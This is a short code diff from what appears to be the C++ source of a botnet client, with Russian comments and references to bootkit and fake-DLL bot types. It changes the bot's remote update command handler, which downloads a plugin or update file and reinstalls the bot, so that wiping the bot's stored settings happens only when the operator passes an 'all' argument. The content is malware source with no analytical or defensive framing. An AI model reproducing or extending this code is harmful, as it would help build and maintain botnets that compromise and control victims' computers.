@@ -740,6 +740,7 @@ bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 {
 	// Загрузить обновление
+	bool DeleteSettings = STRA::Hash(Args, 0, true) == 0x18766C /* all */;
 	#ifdef BOTPLUG
 		//  Для фэкедлл и буткита ссылку игнорируем, загружаем плагин
 		if (BOT::GetBotType() == BotFakeDll || BOT::GetBotType() == BotBootkit)
@@ -749,7 +750,8 @@ bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 			LPBYTE Buf = Plugin::Download(PluginName.t_str(), NULL, &Size, true);
 			if (Buf)
 			{
-				BOT::DeleteSettings();
+				if (DeleteSettings)
+					BOT::DeleteSettings();
 				bool Result = BOT::UpdateBotPlug(Buf, Size);
 				MemFree(Buf);
 				return Result;
@@ -770,7 +772,7 @@ bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 		File.Close();
 
 		if (Result)
-			Result = BOT::MakeUpdate(FileName, true);
+			Result = BOT::MakeUpdate(FileName, DeleteSettings);
 
 		STR::Free(FileName);
 		return Result;
